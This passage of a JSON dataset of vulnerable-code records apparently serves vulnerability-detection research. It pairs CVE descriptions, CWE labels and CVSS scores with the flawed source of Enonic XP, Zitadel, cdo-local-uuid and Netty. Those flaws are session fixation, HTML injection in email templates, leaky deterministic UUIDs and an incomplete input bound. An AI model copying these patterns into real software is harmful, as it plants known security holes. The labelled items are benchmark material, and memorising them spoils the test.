      "CWE-352"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 120,
    "cve": "CVE-2024-23679",
    "description": "Enonic XP versions less than 7.7.4 are vulnerable to a session fixation issue. An remote and unauthenticated attacker can use prior sessions due to the lack of invalidating session attributes.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "modules/lib/lib-auth/src/main/java/com/enonic/xp/lib/auth/LoginHandler.java",
          "content": "package com.enonic.xp.lib.auth;\n\nimport java.util.Comparator;\nimport java.util.concurrent.Callable;\nimport java.util.function.Supplier;\nimport java.util.stream.Collectors;\n\nimport javax.servlet.http.HttpSession;\n\nimport com.enonic.xp.context.Context;\nimport com.enonic.xp.context.ContextBuilder;\nimport com.enonic.xp.portal.PortalRequest;\nimport com.enonic.xp.script.bean.BeanContext;\nimport com.enonic.xp.script.bean.ScriptBean;\nimport com.enonic.xp.security.IdProvider;\nimport com.enonic.xp.security.IdProviderKey;\nimport com.enonic.xp.security.IdProviders;\nimport com.enonic.xp.security.RoleKeys;\nimport com.enonic.xp.security.SecurityConstants;\nimport com.enonic.xp.security.SecurityService;\nimport com.enonic.xp.security.SystemConstants;\nimport com.enonic.xp.security.User;\nimport com.enonic.xp.security.auth.AuthenticationInfo;\nimport com.enonic.xp.security.auth.EmailPasswordAuthToken;\nimport com.enonic.xp.security.auth.UsernamePasswordAuthToken;\nimport com.enonic.xp.security.auth.VerifiedEmailAuthToken;\nimport com.enonic.xp.security.auth.VerifiedUsernameAuthToken;\nimport com.enonic.xp.session.Session;\n\npublic final class LoginHandler\n    implements ScriptBean\n{\n    private enum Scope\n    {\n        SESSION, REQUEST\n    }\n\n    private String user;\n\n    private String password;\n\n    private boolean skipAuth;\n\n    private String[] idProvider;\n\n    private Integer sessionTimeout;\n\n    private Scope scope;\n\n    private Supplier<SecurityService> securityService;\n\n    private Supplier<Context> context;\n\n    private Supplier<PortalRequest> portalRequestSupplier;\n\n    public void setUser( final String user )\n    {\n        this.user = user;\n    }\n\n    public void setPassword( final String password )\n    {\n        this.password = password;\n    }\n\n    public void setSkipAuth( final boolean skipAuth )\n    {\n        this.skipAuth = skipAuth;\n    }\n\n    public void setIdProvider( final String[] idProvider )\n    {\n        this.idProvider = idProvider;\n    }\n\n    public void setSessionTimeout( final Integer sessionTimeout )\n    {\n        this.sessionTimeout = sessionTimeout;\n    }\n\n    public void setScope( final String scope )\n    {\n        this.scope = Scope.valueOf( scope );\n    }\n\n    public LoginResultMapper login()\n    {\n        AuthenticationInfo authInfo = noIdProviderSpecified() ? attemptLoginWithAllExistingIdProviders() : attemptLogin();\n\n        if ( authInfo.isAuthenticated() )\n        {\n            switch ( this.scope )\n            {\n                case REQUEST:\n                    this.context.get().getLocalScope().setAttribute( authInfo );\n                    break;\n                case SESSION:\n                default:\n                    createSession( authInfo );\n                    break;\n            }\n\n            return new LoginResultMapper( authInfo );\n        }\n        else\n        {\n            return new LoginResultMapper( authInfo, \"Access Denied\" );\n        }\n    }\n\n    private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }\n\n    private boolean noIdProviderSpecified()\n    {\n        return this.idProvider == null || this.idProvider.length == 0;\n    }\n\n    private AuthenticationInfo attemptLoginWithAllExistingIdProviders()\n    {\n        final IdProviders idProviders = runAsAuthenticated( this::getSortedIdProviders );\n\n        for ( IdProvider idProvider : idProviders )\n        {\n            final AuthenticationInfo authInfo = authenticate( idProvider.getKey() );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }\n\n    private AuthenticationInfo attemptLogin()\n    {\n\n        for ( String uStore : idProvider )\n        {\n            final AuthenticationInfo authInfo = authenticate( IdProviderKey.from( uStore ) );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private AuthenticationInfo authenticate( IdProviderKey idProvider )\n    {\n        AuthenticationInfo authInfo = null;\n\n        if ( isValidEmail( this.user ) )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedEmailAuthToken verifiedEmailAuthToken = new VerifiedEmailAuthToken();\n                verifiedEmailAuthToken.setEmail( this.user );\n                verifiedEmailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( verifiedEmailAuthToken ) );\n            }\n            else\n            {\n                final EmailPasswordAuthToken emailAuthToken = new EmailPasswordAuthToken();\n                emailAuthToken.setEmail( this.user );\n                emailAuthToken.setPassword( this.password );\n                emailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( emailAuthToken ) );\n            }\n        }\n\n        if ( authInfo == null || !authInfo.isAuthenticated() )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedUsernameAuthToken usernameAuthToken = new VerifiedUsernameAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n            else\n            {\n                final UsernamePasswordAuthToken usernameAuthToken = new UsernamePasswordAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setPassword( this.password );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n        }\n\n        return authInfo;\n    }\n\n    private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }\n\n    private boolean isValidEmail( final String value )\n    {\n        return value != null && value.chars().filter( ch -> ch == '@' ).count() == 1;\n    }\n\n    private void setSessionTimeout()\n    {\n        final PortalRequest portalRequest = this.portalRequestSupplier.get();\n        if ( portalRequest != null )\n        {\n            final HttpSession httpSession = portalRequest.getRawRequest().getSession();\n            if ( httpSession != null )\n            {\n                httpSession.setMaxInactiveInterval( this.sessionTimeout );\n            }\n        }\n    }\n\n    @Override\n    public void initialize( final BeanContext context )\n    {\n        this.securityService = context.getService( SecurityService.class );\n        this.context = context.getBinding( Context.class );\n        this.portalRequestSupplier = context.getBinding( PortalRequest.class );\n    }\n}\n"
        }
      ],
      "method_level": [
        "private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }",
        "private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }",
        "private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 113,
          "content": "        final Session session = this.context.get().getLocalScope().getSession();"
        },
        {
          "line_no": 116,
          "content": "            session.setAttribute( authInfo );"
        },
        {
          "line_no": 117,
          "content": "        }"
        },
        {
          "line_no": 119,
          "content": "        if ( this.sessionTimeout != null )"
        },
        {
          "line_no": 120,
          "content": "        {"
        },
        {
          "line_no": 121,
          "content": "            setSessionTimeout();"
        },
        {
          "line_no": 149,
          "content": "        return IdProviders.from( idProviders.stream()."
        },
        {
          "line_no": 150,
          "content": "            sorted( Comparator.comparing( u -> u.getKey().toString() ) )."
        },
        {
          "line_no": 151,
          "content": "            collect( Collectors.toList() ) );"
        },
        {
          "line_no": 221,
          "content": "        return ContextBuilder.from( this.context.get() )."
        },
        {
          "line_no": 222,
          "content": "            authInfo( authInfo )."
        },
        {
          "line_no": 223,
          "content": "            repositoryId( SystemConstants.SYSTEM_REPO_ID )."
        },
        {
          "line_no": 224,
          "content": "            branch( SecurityConstants.BRANCH_SECURITY ).build()."
        },
        {
          "line_no": 225,
          "content": "            callWith( runnable );"
        }
      ]
    },
    "cwe": [
      "CWE-384"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 1035,
    "cve": "CVE-2024-41953",
    "description": "Zitadel is an open source identity management system. ZITADEL uses HTML for emails and renders certain information such as usernames dynamically. That information can be entered by users or administrators. Due to a missing output sanitization, these emails could include malicious code. This may potentially lead to a threat where an attacker, without privileges, could send out altered notifications that are part of the registration processes. An attacker could create a malicious link, where the injected code would be rendered as part of the email. On the user's detail page, the username was also not sanitized and would also render HTML, giving an attacker the same vulnerability. While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by most email clients and the Content Security Policy in Console UI. This vulnerability is fixed in 2.58.1, 2.57.1, 2.56.2, 2.55.5, 2.54.8 2.53.9, and 2.52.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/notification/templates/templateData.go",
          "content": "package templates\n\nimport (\n\t\"fmt\"\n\t\"html\"\n\n\t\"github.com/zitadel/zitadel/internal/domain\"\n\t\"github.com/zitadel/zitadel/internal/i18n\"\n)\n\nconst (\n\tDefaultFontFamily      = \"-apple-system, BlinkMacSystemFont, Segoe UI, Lato, Arial, Helvetica, sans-serif\"\n\tDefaultFontColor       = \"#22292f\"\n\tDefaultBackgroundColor = \"#fafafa\"\n\tDefaultPrimaryColor    = \"#5282C1\"\n)\n\ntype TemplateData struct {\n\tTitle           string\n\tPreHeader       string\n\tSubject         string\n\tGreeting        string\n\tText            string\n\tURL             string\n\tButtonText      string\n\tPrimaryColor    string\n\tBackgroundColor string\n\tFontColor       string\n\tLogoURL         string\n\tFontURL         string\n\tFontFaceFamily  string\n\tFontFamily      string\n\n\tIncludeFooter bool\n\tFooterText    string\n}\n\nfunc (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}\n"
        }
      ],
      "method_level": [
        "func (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.3,
    "cvss_version": 3.1
  },
  {
    "id": 71,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to title 17 Section 105 of the\n# United States Code this software is not subject to copyright\n# protection and is in the public domain. NIST assumes no\n# responsibility whatsoever for its use by other parties, and makes\n# no guarantees, expressed or implied, about its quality,\n# reliability, or any other characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\"\"\"\n\n__version__ = \"0.3.0\"\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            DeprecationWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\"\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\"\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers in sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, an environment variable must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            DeprecationWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\"\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\"\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 88,
          "content": "        try:"
        },
        {
          "line_no": 94,
          "content": "        except ValueError:"
        },
        {
          "line_no": 95,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 96,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 29,
    "cve": "CVE-2025-25193",
    "description": "Netty, an asynchronous, event-driven network application framework, has a vulnerability in versions up to and including 4.1.118.Final. An unsafe reading of environment file could potentially cause a denial of service in Netty. When loaded on an Windows application, Netty attempts to load a file that does not exist. If an attacker creates such a large file, the Netty application crash. A similar issue was previously reported as CVE-2024-47535. This issue was fixed, but the fix was incomplete in that null-bytes were not counted against the input limit. Commit d1fbda62d3a47835d3fb35db8bd42ecc205a5386 contains an updated fix.",
    "vulnerability": {
      "file_level": [
        {
          "name": "common/src/main/java/io/netty/util/internal/BoundedInputStream.java",
          "content": "/*\n * Copyright 2024 The Netty Project\n *\n * The Netty Project licenses this file to you under the Apache License,\n * version 2.0 (the \"License\"); you may not use this file except in compliance\n * with the License. You may obtain a copy of the License at:\n *\n *   https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n * License for the specific language governing permissions and limitations\n * under the License.\n */\npackage io.netty.util.internal;\n\nimport org.jetbrains.annotations.NotNull;\n\nimport java.io.FilterInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\n\npublic final class BoundedInputStream extends FilterInputStream {\n\n    private final int maxBytesRead;\n    private int numRead;\n\n    public BoundedInputStream(@NotNull InputStream in, int maxBytesRead) {\n        super(in);\n        this.maxBytesRead = ObjectUtil.checkPositive(maxBytesRead, \"maxRead\");\n    }\n\n    public BoundedInputStream(@NotNull InputStream in) {\n        this(in, 8 * 1024);\n    }\n\n    @Override\n    public int read() throws IOException {\n        checkMaxBytesRead();\n\n        int b = super.read();\n        if (b > 0) {\n            numRead++;\n        }\n\n        checkMaxBytesRead();\n        return b;\n    }\n\n    @Override\n    public int read(byte[] buf, int off, int len) throws IOException {\n        checkMaxBytesRead();\n\n        // Calculate the maximum number of bytes that we should try to read.\n        int num = Math.min(len, maxBytesRead - numRead + 1);\n\n        int b = super.read(buf, off, num);\n\n        if (b > 0) {\n            numRead += b;\n        }\n\n        checkMaxBytesRead();\n        return b;\n    }\n\n    private void checkMaxBytesRead() throws IOException {\n        if (numRead > maxBytesRead) {\n            throw new IOException(\"Maximum number of bytes read: \" + numRead);\n        }\n    }\n}\n"
        },
        {
          "name": "common/src/test/java/io/netty/util/internal/BoundedInputStreamTest.java",
          "content": "/*\n * Copyright 2024 The Netty Project\n *\n * The Netty Project licenses this file to you under the Apache License,\n * version 2.0 (the \"License\"); you may not use this file except in compliance\n * with the License. You may obtain a copy of the License at:\n *\n *   https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n * License for the specific language governing permissions and limitations\n * under the License.\n */\npackage io.netty.util.internal;\n\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.function.Executable;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.util.Arrays;\n\nimport static org.junit.jupiter.api.Assertions.assertArrayEquals;\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertThrows;\n\npublic class BoundedInputStreamTest {\n\n    @Test\n    void testBoundEnforced() throws IOException {\n        final byte[] bytes = new byte[64];\n        PlatformDependent.threadLocalRandom().nextBytes(bytes);\n        final BoundedInputStream reader = new BoundedInputStream(new ByteArrayInputStream(bytes), bytes.length - 1);\n        assertEquals(bytes[0], (byte) reader.read());\n\n        assertThrows(IOException.class, new Executable() {\n            @Override\n            public void execute() throws Throwable {\n                reader.read(new byte[64], 0, 64);\n            }\n        });\n        reader.close();\n    }\n\n    @Test\n    void testBigReadsPermittedIfUnderlyingStreamIsSmall() throws IOException {\n        final byte[] bytes = new byte[64];\n        PlatformDependent.threadLocalRandom().nextBytes(bytes);\n        final BoundedInputStream reader = new BoundedInputStream(new ByteArrayInputStream(bytes), 8192);\n        final byte[] buffer = new byte[10000];\n        reader.read(buffer, 0, 10000);\n        assertArrayEquals(bytes, Arrays.copyOfRange(buffer, 0, 64));\n        reader.close();\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Override\n    public int read() throws IOException {\n        checkMaxBytesRead();\n\n        int b = super.read();\n        if (b > 0) {\n            numRead++;\n        }\n\n        checkMaxBytesRead();\n        return b;\n    }",
        "@Override\n    public int read(byte[] buf, int off, int len) throws IOException {\n        checkMaxBytesRead();\n\n        // Calculate the maximum number of bytes that we should try to read.\n        int num = Math.min(len, maxBytesRead - numRead + 1);\n\n        int b = super.read(buf, off, num);\n\n        if (b > 0) {\n            numRead += b;\n        }\n\n        checkMaxBytesRead();\n        return b;\n    }",
        "@Test\n    void testBoundEnforced() throws IOException {\n        final byte[] bytes = new byte[64];\n        PlatformDependent.threadLocalRandom().nextBytes(bytes);\n        final BoundedInputStream reader = new BoundedInputStream(new ByteArrayInputStream(bytes), bytes.length - 1);\n        assertEquals(bytes[0], (byte) reader.read());\n\n        assertThrows(IOException.class, new Executable() {\n            @Override\n            public void execute() throws Throwable {\n                reader.read(new byte[64], 0, 64);\n            }\n        });\n        reader.close();\n    }",
        "@Override\n            public void execute() throws Throwable {\n                reader.read(new byte[64], 0, 64);\n            }",
        "@Test\n    void testBigReadsPermittedIfUnderlyingStreamIsSmall() throws IOException {\n        final byte[] bytes = new byte[64];\n        PlatformDependent.threadLocalRandom().nextBytes(bytes);\n        final BoundedInputStream reader = new BoundedInputStream(new ByteArrayInputStream(bytes), 8192);\n        final byte[] buffer = new byte[10000];\n        reader.read(buffer, 0, 10000);\n        assertArrayEquals(bytes, Arrays.copyOfRange(buffer, 0, 64));\n        reader.close();\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "        if (b > 0) {"
        },
        {
          "line_no": 47,
          "content": "        checkMaxBytesRead();"
        },
        {
          "line_no": 60,
          "content": "        if (b > 0) {"
        },
        {
          "line_no": 64,
          "content": "        checkMaxBytesRead();"
        },
        {
          "line_no": 31,
          "content": "    @Test"
        },
        {
          "line_no": 41,
          "content": "                reader.read(new byte[64], 0, 64);"
        },
        {
          "line_no": 41,
          "content": "                reader.read(new byte[64], 0, 64);"
        },
        {
          "line_no": 53,
          "content": "        reader.read(buffer, 0, 10000);"
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.5,
    "cvss_version": 3.1
  },
  {
    "id": 78,
    "cve": "CVE-2024-22198",
